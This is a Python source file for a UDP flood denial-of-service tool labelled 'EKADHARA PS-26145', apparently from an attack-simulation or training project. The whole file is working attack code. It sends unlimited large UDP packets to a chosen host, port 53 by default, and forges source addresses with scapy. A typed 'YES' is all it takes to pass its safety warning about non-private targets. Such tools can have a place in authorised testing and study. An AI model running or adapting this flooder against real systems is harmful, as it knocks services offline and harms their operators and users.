"""UDP Flood attack — sends UDP packets with large payloads."""
import argparse
import ipaddress
import os
import random
import socket
import struct
import sys
import threading
import time
from typing import Optional

try:
    from scapy.all import IP, UDP, send, RandShort, RandString, conf
    from scapy.layers.inet import IP as SC_IP, UDP as SC_UDP
    SCAPY_AVAILABLE = True
    conf.verb = 0
except ImportError:
    SCAPY_AVAILABLE = False

# ── ANSI Colors ─────────────────────────────────────────────────────────────
class Color:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def banner():
    print(f"""{Color.BOLD}{Color.CYAN}
╔══════════════════════════════════════════╗
║  [EKADHARA] UDP Flood — PS-26145        ║
╚══════════════════════════════════════════╝{Color.RESET}""")

def is_private(target: str) -> bool:
    try:
        addr = ipaddress.ip_address(target)
        return addr.is_private or addr.is_loopback
    except ValueError:
        try:
            addr = socket.gethostbyname(target)
            return ipaddress.ip_address(addr).is_private or ipaddress.ip_address(addr).is_loopback
        except socket.gaierror:
            return False

def safety_check(target: str):
    if not is_private(target):
        print(f"{Color.YELLOW}[!] WARNING: Target {target} is NOT a private/local IP!{Color.RESET}")
        print(f"{Color.YELLOW}[!] Only attack systems you own or have explicit permission to test.{Color.RESET}")
        confirm = input(f"{Color.YELLOW}[?] Type 'YES' to continue: {Color.RESET}")
        if confirm != "YES":
            print(f"{Color.RED}[!] Aborted.{Color.RESET}")
            sys.exit(0)
        print(f"{Color.GREEN}[*] Proceeding with external target...{Color.RESET}")

def generate_payload(size: int, mode: str = "random") -> bytes:
    """Generate UDP payload in various modes."""
    if mode == "dns_amp":
        # Simulate DNS amplification: large-ish response data
        return os.urandom(min(size, 4096))
    elif mode == "random":
        return os.urandom(size)
    elif mode == "repeated":
        pattern = b"".join([bytes([random.randint(65, 90)]) for _ in range(8)])
        return (pattern * ((size // len(pattern)) + 1))[:size]
    elif mode == "zero":
        return b"\x00" * size
    else:
        return os.urandom(size)

def run_scapy_attack(target_ip: str, port: int, count: int, size: int, rate: float,
                     mode: str, stop_event: threading.Event, stats: dict):
    """Run UDP flood using scapy."""
    sent = 0
    start = time.time()
    payload = generate_payload(size, mode)
    print(f"{Color.GREEN}[+] Scapy mode active{Color.RESET}")
    print(f"{Color.BLUE}[*] Payload mode: {mode} | Size: {size} bytes{Color.RESET}")

    while not stop_event.is_set() and (count == 0 or sent < count):
        batch = min(int(rate) if rate > 0 else 50, 200)
        packets = []
        for _ in range(batch):
            sport = random.randint(1024, 65535)
            pkt = IP(src=f"10.0.{random.randint(0,255)}.{random.randint(1,254)}",
                     dst=target_ip) / UDP(sport=sport, dport=port) / payload[:size]
            packets.append(pkt)
        try:
            send(packets, verbose=False)
            sent += len(packets)
        except Exception as e:
            print(f"\n{Color.RED}[-] Send error: {e}{Color.RESET}")
        stats["sent"] = sent
        elapsed = time.time() - start
        if elapsed > 0:
            stats["rate"] = sent / elapsed
        time.sleep(0.5 if rate == 0 else max(0.01, 1.0 / rate))

def run_socket_attack(target_ip: str, port: int, count: int, size: int, rate: float,
                       mode: str, stop_event: threading.Event, stats: dict):
    """Run UDP flood using raw sockets."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    start = time.time()
    payload = generate_payload(size, mode)
    print(f"{Color.GREEN}[+] Socket mode active{Color.RESET}")
    print(f"{Color.BLUE}[*] Payload mode: {mode} | Size: {size} bytes{Color.RESET}")

    while not stop_event.is_set() and (count == 0 or sent < count):
        batch = min(int(rate) if rate > 0 else 50, 200)
        for _ in range(batch):
            try:
                sock.sendto(payload[:size], (target_ip, port))
                sent += 1
            except Exception:
                pass
        stats["sent"] = sent
        elapsed = time.time() - start
        if elapsed > 0:
            stats["rate"] = sent / elapsed
        time.sleep(0.5 if rate == 0 else max(0.01, 1.0 / rate))
    sock.close()

def attack_thread(target_ip: str, port: int, count: int, size: int, rate: float,
                   mode: str, stats: dict):
    stop_event = threading.Event()
    stats["stop_event"] = stop_event
    if SCAPY_AVAILABLE:
        run_scapy_attack(target_ip, port, count, size, rate, mode, stop_event, stats)
    else:
        run_socket_attack(target_ip, port, count, size, rate, mode, stop_event, stats)

def run_attack(target: str, port: int = 53, count: int = 0, size: int = 1024,
               rate: float = 100, mode: str = "random", **kwargs):
    """
    Launch the UDP flood attack.

    Args:
        target: Target IP or hostname
        port:   Target UDP port (default 53 — DNS)
        count:  Packet count (0=unlimited)
        size:   Payload size in bytes (default 1024)
        rate:   Packets per second (default 100)
        mode:   Payload mode: random, repeated, zero, dns_amp
    """
    banner()
    print(f"{Color.BLUE}[*] Target: {target}:{port}{Color.RESET}")
    print(f"{Color.BLUE}[*] Packets: {'Unlimited' if count == 0 else count} | Size: {size} bytes{Color.RESET}")
    print(f"{Color.BLUE}[*] Rate: {rate if rate > 0 else 'Maximum'} pps | Mode: {mode}{Color.RESET}")
    print(f"{Color.BLUE}[*] Backend: {'Scapy' if SCAPY_AVAILABLE else 'Raw Socket (fallback)'}{Color.RESET}")

    safety_check(target)
    stats = {"sent": 0, "rate": 0.0}
    t = threading.Thread(target=attack_thread, args=(target, port, count, size, rate, mode, stats), daemon=True)
    t.start()
    return t, stats


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UDP Flood Attack Simulator — EKADHARA PS-26145")
    parser.add_argument("--target", required=True, help="Target IP or hostname")
    parser.add_argument("--port", type=int, default=53, help="Target UDP port (default: 53)")
    parser.add_argument("--count", type=int, default=0, help="Packet count (0=unlimited)")
    parser.add_argument("--size", type=int, default=1024, help="Payload size in bytes (default: 1024)")
    parser.add_argument("--rate", type=float, default=100, help="Packets per second (default: 100)")
    parser.add_argument("--mode", choices=["random", "repeated", "zero", "dns_amp"], default="random",
                        help="Payload mode (default: random)")
    args = parser.parse_args()

    banner()
    t, stats = run_attack(args.target, args.port, args.count, args.size, args.rate, args.mode)

    print(f"\n{Color.GREEN}[+] Attack running — Press Ctrl+C to stop{Color.RESET}")
    print(f"{Color.CYAN}{'─'*55}{Color.RESET}")
    print(f"  {'Sent':>10}  {'Rate':>10}  {'Bandwidth':>12}  {'Status':>15}")
    print(f"{Color.CYAN}{'─'*55}{Color.RESET}")

    try:
        while t.is_alive():
            bw = stats["sent"] * args.size / (time.time() - (stats.get("_start", time.time())))
            bw_str = f"{bw/1024:.0f} KB/s" if bw < 1e6 else f"{bw/1e6:.1f} MB/s"
            print(f"\r  {Color.GREEN}{stats['sent']:>10,}{Color.RESET}  "
                  f"{Color.YELLOW}{stats['rate']:>9.1f}/s{Color.RESET}  "
                  f"{Color.CYAN}{bw_str:>12}{Color.RESET}  "
                  f"{'Flooding':>15}", end="", flush=True)
            stats["_start"] = time.time()
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n\n{Color.YELLOW}[!] Stopping...{Color.RESET}")
        if "stop_event" in stats:
            stats["stop_event"].set()
        t.join(timeout=3)
        print(f"{Color.GREEN}[+] Sent {stats['sent']:,} UDP packets total.{Color.RESET}")
